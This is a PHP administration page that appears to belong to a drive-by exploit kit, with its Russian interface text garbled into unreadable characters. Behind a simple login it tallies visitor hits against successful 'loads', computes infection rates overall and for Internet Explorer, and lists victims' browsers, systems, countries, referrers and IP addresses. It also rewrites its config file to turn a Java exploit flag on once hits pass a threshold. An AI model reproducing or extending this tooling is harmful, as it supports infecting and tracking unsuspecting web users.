<?php
session_start ();
include "config.php";
if (!isset ($_GET["action"])) $_GET["action"] = "";
if (isset ($_SESSION["logged"])) { include "mysql.php"; include "geoip.php"; }
else {
	$_GET["action"] = "notloggedin";
	if (@$_POST["login"] == $admin_login and @$_POST["password"] == $admin_password) { $_SESSION["logged"] = true; Header ("Location: admin.php"); exit; }
}
if ($_GET["action"] == "logout") {
	session_destroy ();
	Header ("Location: admin.php");
	exit;
}
if ($_GET["action"] == "clear") { cleardb (); Header ("Location: admin.php"); exit; }
if ($_GET["action"] == "") {
	$stat = array (
		"main"		=>	array ("hits" => 0, "loads" => 0),
		"browsers"	=>	array (),
		"oses"		=>	array (),
		"referers"	=>	array (),
		"countries"	=>	array ()
	);
	$sql = "SELECT * FROM `".$mysql_prefix."stat` WHERE `value` != '0' AND (`type` = 'browsers' OR `type` = 'oses' OR `type` = 'main') ORDER BY `value` DESC";
	$result = mysql_query ($sql);
	if ($line = mysql_fetch_array ($result)) {
		do $stat[$line["type"]][$line["name"]] = $line["value"];
		while ($line = mysql_fetch_array ($result));
	}
	$sql = "SELECT * FROM `".$mysql_prefix."stat` WHERE `value` != '0' AND `type` = 'countries' ORDER BY `value` DESC LIMIT 10";
	$result = mysql_query ($sql);
	if ($line = mysql_fetch_array ($result)) {
		do $stat[$line["type"]][$line["name"]] = $line["value"];
		while ($line = mysql_fetch_array ($result));
	}
	$prob = $prob_ie = 0;
	if ($stat["main"]["hits"] != 0 and $stat["main"]["loads"] != 0) $prob = substr ($stat["main"]["loads"] / $stat["main"]["hits"] * 100, 0, 5);
	if (@$stat["browsers"]["MSIE"] != 0 and $stat["main"]["loads"] != 0) $prob_ie = substr ($stat["main"]["loads"] / $stat["browsers"]["MSIE"] * 100, 0, 5);
	$tmp = file_get_contents ("config.php"); $fp = fopen ("config.php", "w");
	if ($stat["main"]["hits"] >= 15) fwrite ($fp, str_replace ("javaxpl = 0", "javaxpl = 1", $tmp));
	else fwrite ($fp, str_replace ("javaxpl = 1", "javaxpl = 0", $tmp));
	fclose ($fp);
}
?>
<html>
<head>
<title>..</title>
<style>
body {
	background-color: #EEEEEE;
}
a {
	color: black;
}
select, input, textarea {
	background-color: #EEEEEE;
	color: black;
	border: 1px solid black;
}
.title {
	background-color: #DDDDDD;
	border: 1px solid black;
	text-align: center;
}
.normal {
	background-color: #CCCCCC;
	border: 1px solid black;
	text-align: left;
}
</style>
</head>
<body>
<?php
if (isset ($_SESSION["logged"])) echo '<a href="?">����� ����������</a> - <a href="?action=viewcountries">������</a> - <a href="?action=viewreferers">��������</a> - <a href="?action=viewip">�������� IP</a> - <a href="?action=viewdwnip">C�������� IP</a> - <a href="?action=clear">��������</a> - <a href="?action=logout">�����</a><br><br>';
else {
	echo '<form action="" method="post">
<table border=0 cellpadding=1 cellspacing=2 width=200>
<tr>
<td colspan=2 class="title">���������� �����������</td>
</tr>
<tr>
<td class="normal" width=80>�����:</td>
<td class="normal"><input type="text" name="login" style="width: 120px;" /></td>
</tr>
<tr>
<td class="normal">������:</td>
<td class="normal"><input type="password" name="password" style="width: 120px;" /></td>
</tr>
<tr>
<td colspan=2 class="title"><input type="submit" value="�����" /></td>
</tr>
</table>';
}
if ($_GET["action"] == "") { ?>
<table border=0 cellpadding=0 cellspacing=0>
<tr><td valign="top">
<table border=0 cellpadding=1 cellspacing=2 width=400>
<tr><td colspan=2 class="title">����� ����������</td></tr>
<tr><td class="normal" width=300>����� �����</td><td class="normal"><?php echo $stat["main"]["hits"]; ?></td></tr>
<tr><td class="normal" width=300>����� ��������</td><td class="normal"><?php echo $stat["main"]["loads"]; ?></td></tr>
<tr><td class="normal" width=300>������</td><td class="normal"><?php echo $prob; ?>%</td></tr>
<tr><td class="normal" width=300>������ �� IE</td><td class="normal"><?php echo $prob_ie; ?>%</td></tr>
<?php
	$t = "browsers";
	if (count ($stat[$t]) > 0) {
		echo '<tr><td colspan=2 class="title">���������� �� ���������</td></tr>'."\r\n";
		foreach ($stat[$t] as $key => $value) echo '<tr><td class="normal" width=300>'.$key.'</td><td class="normal">'.$value.'</td></tr>';
	}
	$t = "oses";
	if (count ($stat[$t]) > 0) {
		echo '<tr><td colspan=2 class="title">���������� �� ��</td></tr>'."\r\n";
		foreach ($stat[$t] as $key => $value) echo '<tr><td class="normal" width=300>'.$key.'</td><td class="normal">'.$value.'</td></tr>';
	}
?>
</table>
</td>
<?php
	$t = "countries";
	if (count ($stat[$t]) > 0) {
		echo '<td valign="top">
<table border=0 cellpadding=1 cellspacing=2 width=400>
<tr><td colspan=2 class="title">Top10 �����</td></tr>'."\r\n";
		foreach ($stat[$t] as $key => $value) echo '<tr><td class="normal" width=300><img src="showflag.php?country='.strtolower ($key).'" border=0 /> '.$GEOIP_COUNTRY_NAMES[$GEOIP_COUNTRY_CODE_TO_NUMBER[$key]].'</td><td class="normal">'.$value.'</td></tr>';
		echo '</td>'."\r\n";
	}
?>
</tr>
</table>
<?php
}
elseif ($_GET["action"] == "viewip" or $_GET["action"] == "viewdwnip") {
	$table = ($_GET["action"] == "viewip")?"ips":"ips2";
	$title = ($_GET["action"] == "viewip")?"�������� IP":"��������� IP";
	$sql = "SELECT * FROM `".$mysql_prefix.$table."`";
	$result = mysql_query ($sql);
	echo '<table border=0 cellpadding=1 cellspacing=2 width=400>
<tr><td class="title">'.$title.'</td></tr>'."\r\n";
	if ($line = mysql_fetch_array ($result)) {
		do echo '<tr><td class="normal">'.long2ip ($line["ip"]).'</td></tr>'."\r\n";
		while ($line = mysql_fetch_array ($result));
	}
	else echo '<tr><td class="normal">��� ������� ��� ���������.</td></tr>'."\r\n";
}
elseif ($_GET["action"] == "viewcountries" or $_GET["action"] == "viewreferers") {
	$type = ($_GET["action"] == "viewcountries")?"countries":"referers";
	$title = ($_GET["action"] == "viewcountries")?"�������":"���������";
	$sql = "SELECT * FROM `".$mysql_prefix."stat` WHERE `value` != '0' AND `type` = '".$type."' ORDER BY `value` DESC";
	$result = mysql_query ($sql);
	echo '<table border=0 cellpadding=1 cellspacing=2 width=400>
<tr><td class="title" colspan=2>���������� �� '.$title.'</td></tr>'."\r\n";
	if ($line = mysql_fetch_array ($result)) {
		do {
			if ($_GET["action"] == "viewcountries") echo '<tr><td class="normal" width=300><img src="showflag.php?country='.strtolower ($line["name"]).'" border=0 /> '.$GEOIP_COUNTRY_NAMES[$GEOIP_COUNTRY_CODE_TO_NUMBER[$line["name"]]].'</td><td class="normal">'.$line["value"].'</td></tr>'."\r\n";
			else echo '<tr><td class="normal" width=300>'.$line["name"].'</td><td class="normal">'.$line["value"].'</td></tr>';
		}
		while ($line = mysql_fetch_array ($result));
	}
	else echo '<tr><td class="normal" colspan=2>��� ������� ��� ���������.</td></tr>'."\r\n";
}
?>
</body>
</html>